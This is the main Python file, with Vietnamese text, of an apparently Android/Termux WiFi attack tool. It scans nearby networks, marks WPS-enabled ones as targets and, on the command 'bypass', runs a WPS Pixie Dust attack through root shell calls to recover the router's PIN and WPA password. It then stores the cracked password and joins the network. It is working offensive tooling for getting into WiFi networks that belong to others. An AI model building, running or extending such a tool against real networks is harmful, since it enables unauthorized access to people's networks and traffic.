# main.py
import subprocess
import signal
import os
import sys
import time
import re
import json
import hashlib
import struct
import shutil
import importlib.util

from tinhnang.cong_cu import *
from tinhnang.WifiMaster import *
from pws import *
from tinhnang.server import *
from tinhnang.chuanbi import *
from tinhnang.core.paths import ensure_dirs, DATA_DIR, CONFIG_FILE
from tinhnang.core.config import get_config


# ================== HÀM TẤN CÔNG WPS ==================
def tan_cong_wps_with_cleanup(bssid, interface=None, use_pixie=True, save_result=True):
    cfg = get_config()
    if interface is None:
        interface = cfg.interface

    print(f"[*] Đang chuẩn bị mục tiêu: {bssid}  (iface={interface})")
    os.system("su -c 'svc wifi disable'")
    time.sleep(2)
    os.system(f"su -c 'ip link set {interface} up'")

    result = None
    try:
        result = tan_cong_wps(mac=bssid, interface=interface,
                              use_pixie=use_pixie, save_result=save_result)
        if result['success']:
            print(f"[+] Thành công!")
            print(f"[+] BSSID: {result.get('bssid', 'N/A')}")
            print(f"[+] ESSID: {result.get('essid', 'N/A')}")
            print(f"[+] WPS PIN: {result.get('wps_pin', 'N/A')}")
            print(f"[+] WPA PSK: {result.get('wpa_psk', 'N/A')}")
        else:
            print(f"[-] Thất bại: {result.get('error', 'Unknown error')}")
    except Exception as e:
        print(f"[!] Lỗi phát sinh: {e}")
        result = {'success': False, 'error': str(e)}
    finally:
        print("\n[*] Đang dọn dẹp...")
        os.system("su -c 'pkill wpa_supplicant'")
        os.system("su -c 'pkill pixiewps'")
        os.system("su -c 'rm -rf /data/local/tmp/wpa_ctrl_*'")
        os.system("su -c 'rm -rf /tmp/wpa_ctrl_*'")
        os.system("su -c 'svc wifi enable'")
        time.sleep(3)
        print("[+] Đã khôi phục Wifi hệ thống!")
    return result


# ================== BANNER ==================
def print_banner(version="3.0.1"):
    os.system('clear')
    CYAN = "\033[1;36m"; GREEN = "\033[1;32m"; YELLOW = "\033[1;33m"
    RESET = "\033[0m"; BOLD = "\033[1m"
    cfg = get_config()
    print(f"{CYAN}{'='*50}{RESET}")
    print(f"{BOLD}{YELLOW}      ACDV-Teams WiFi Connect Tool{RESET}")
    print(f"{CYAN}{'='*50}{RESET}")
    print(f"{GREEN}  Phiên bản  :{RESET} {version}")
    print(f"{GREEN}  Tính năng  :{RESET} Quét WiFi, Kết nối WPS (Pixie Dust)")
    print(f"{GREEN}  Thiết bị   :{RESET}  ({cfg.interface})")
    print(f"{GREEN}  Root       :{RESET}  "
          f"{'✓ CÓ (' + cfg.root_method + ')' if cfg.is_root else '✗ KHÔNG'}")
    print(f"{GREEN}  Config     :{RESET}  {cfg.config_path}")
    print(f"{CYAN}{'='*50}{RESET}")
    print(f"{YELLOW}[*] Đang khởi động hệ thống...{RESET}\n")


def start_server():
    cfg = get_config()
    host = cfg.host
    port = cfg.port
    dongcong([port, port + 1])

    print(f"\n{'='*60}")
    print(f"ACDV-Teams WiFi Security Tool v3.0.1 (Plugin Architecture)")
    print(f"{'='*60}")
    print(f"HTTP Server: http://{host if host != '0.0.0.0' else 'localhost'}:{port}")
    print(f"WebSocket: ws://{host if host != '0.0.0.0' else 'localhost'}:{port + 1}")
    print(f"Root      : {'✓ ' + cfg.root_method if cfg.is_root else '✗ KHÔNG'}")
    print(f"Interface : {cfg.interface}")
    print(f"{'='*60}\n")
    print("[!] Nhấn Ctrl+C để dừng server và chuyển về Console.")

    server = WiFiServer(host, port)
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Đã dừng server. Chuyển về Console...")
        time.sleep(1)
        return


# ================== MENU CONSOLE ==================
def console_mode():
    cfg = get_config()
    terminal = chay_terminal()
    wifi_master = WifiManager()          # ← DÙNG CONFIG
    manager_file = FileManager()

    while True:
        print_banner(version="3.0.1")
        print(f"\n--- CONSOLE MODE ---")
        print("1: Quét Wifi")
        print("2: Kết Nối Bằng SSID, MAC")
        print("3: Clear All (Giải phóng card WiFi)")
        print("q: Quay lại chế độ Server")
        print("quit: Thoát chương trình")

        cmd = input("Nhập tùy chọn: ").strip().lower()

        if cmd == "quit":
            wifi_master.restart()
            print("[*] Tạm biệt! 💨")
            sys.exit(0)
        elif cmd == "q":
            print("[*] Quay lại chế độ Server...")
            return
        elif cmd == "3":
            wifi_master.restart()
            print("[+] Đã hoàn tất giải phóng card WiFi!")
            input("Nhấn Enter để tiếp tục...")
        elif cmd == "1":
            if not cfg.can_run("scan"):
                print(f"[-] {cfg.get_reason_blocked('scan')}")
                input("Enter...")
                continue
            wifi_master.set_status(1)
            time.sleep(2)
            while True:
                print("[*] Đang quét WiFi...")
                wifi_master.restart()
                time.sleep(3)
                data = wifi_master.scan()
                kho_bau = manager_file.read_file("networks.acdv")

                if not data or not data.get('success'):
                    print("[-] Không tìm thấy WiFi nào.")
                    break

                print(f"\n--- DANH SÁCH WIFI ---")
                print(f"{'STT':<4} | {'Tên Wifi':<25} | {'BSSID (MAC)':<20} | {'WPS':<5} | {'Cường độ':<35} | {'Trạng thái'}")
                print("-" * 120)
                for stt, info in data['data'].items():
                    ten_wifi = info['ssid']
                    mac_wifi = info['bssid'].upper()
                    wps_status = "✅ Có" if info['is_wps'] else "❌ Không"
                    signal_info = info.get('quality', 'N/A')
                    trang_thai = "Mới"
                    if kho_bau.get('status') == 'ACDV-Files' and kho_bau.get('data'):
                        for key, value in kho_bau['data'].items():
                            if len(value) >= 3 and mac_wifi in value[0].upper():
                                trang_thai = "[ĐÃ CÓ PASS] ✅"
                                break
                    ten_hien_thi = ten_wifi[:24] + "..." if len(ten_wifi) > 24 else ten_wifi
                    print(f"{stt:<4} | {ten_hien_thi:<25} | {mac_wifi:<20} | {wps_status:<5} | {signal_info:<35} | {trang_thai}")

                print("\n[*] Nhập 'p' quay lại | 'r' quét lại.")
                try:
                    ui = input("Chọn STT: ").strip()
                    if ui == "p": break
                    if ui.lower() == "r": continue
                    selected = int(ui)
                    if selected in data['data']:
                        target = data['data'][selected]
                        target_ssid = target['ssid']
                        target_bssid = target['bssid']
                        target_security = target['security']
                        target_wps = target['is_wps']
                        target_signal = target.get('quality', 'N/A')

                        while True:
                            print(f"\n[!] Mục tiêu: {target_ssid} ({target_bssid})")
                            print(f"[!] Cường độ: {target_signal}")
                            print("[⚠] WPS BẬT" if target_wps else "[ℹ] WPS TẮT")
                            print("Nhập 'bypass' để tấn công WPS | '0' để quay lại")

                            pass_cu = None
                            if kho_bau.get('status') == 'ACDV-Files' and kho_bau.get('data'):
                                for key, val in kho_bau['data'].items():
                                    if len(val) >= 3 and target_bssid.upper() in val[0].upper():
                                        pass_cu = val[2]; break
                            if pass_cu:
                                print(f"👉 Gợi ý pass đã lưu: {pass_cu}")

                            pasd = input("Nhập Mật Khẩu: ").strip()
                            if pasd == "0": break
                            if pasd.lower() == "bypass":
                                if target_wps:
                                    if not cfg.can_run("wps_attack"):
                                        print(f"[-] {cfg.get_reason_blocked('wps_attack')}")
                                        continue
                                    result = tan_cong_wps_with_cleanup(
                                        bssid=target_bssid,
                                        interface=None,
                                        use_pixie=True, save_result=True)
                                    if result['success'] and result.get('wpa_psk'):
                                        wpa_psk = result['wpa_psk']
                                        tu_dong_them_wifi(manager_file, "networks.acdv",
                                                          [target_bssid, target_ssid, wpa_psk, target_security])
                                        if wifi_master.connect(target_ssid, wpa_psk, security=target_security):
                                            print("[+] Kết nối THÀNH CÔNG!")
                                            input("Enter..."); break
                                    else:
                                        print("[-] Tấn công WPS thất bại.")
                                else:
                                    print("[!] WPS không khả dụng.")
                            else:
                                if wifi_master.connect(target_ssid, password=pasd, security=target_security):
                                    print(f"[+] Kết nối THÀNH CÔNG!")
                                    tu_dong_them_wifi(manager_file, "networks.acdv",
                                                      [target_bssid, target_ssid, pasd, target_security])
                                    input("Enter..."); break
                                else:
                                    print("[-] Kết nối thất bại.")
                    else:
                        print("[!] STT không tồn tại!")
                except ValueError:
                    print("[!] Nhập số!")
                except Exception as e:
                    print(f"[!] Lỗi: {e}")
            input("Enter để tiếp tục...")
        elif cmd == "2":
            print("[Tính năng đang phát triển]")
            input("Enter...")
        else:
            print("[!] Lựa chọn không hợp lệ!")
            input("Enter...")


# ================== MAIN ==================
def main():
    ensure_dirs()

    cfg = get_config()
    cfg.load(auto_create=True)
    cfg.detect_root()
    cfg.apply_environment()

    print(f"[*] Data directory: {DATA_DIR}")
    print(f"[*] Config file   : {CONFIG_FILE}")
    print(f"[*] Interface     : {cfg.interface}")
    print(f"[*] Server        : {cfg.host}:{cfg.port}")
    print(f"[*] Root          : "
          f"{'✓ CÓ (' + cfg.root_method + ')' if cfg.is_root else '✗ KHÔNG'}")

    print_banner(version="3.0.1")
    print("[1] Khởi động Server (Web + WebSocket)")
    print("[2] Vào Console Mode (Termux)")
    print("[3] Thoát")

    # Giữ nguyên logic cũ: luôn vào server trước
    start_server()
    print("\n[*] Server đã dừng.")
    con_choice = input("Vào Console Mode? (y/n): ").strip().lower()
    if con_choice == 'y':
        console_mode()
    else:
        print("[*] Tạm biệt!")
        sys.exit(0)

    while True:
        again = input("\n[?] Quay lại Server? (y/n): ").strip().lower()
        if again == 'y':
            start_server()
        else:
            print("[*] Tạm biệt!")
            break


if __name__ == "__main__":
    main()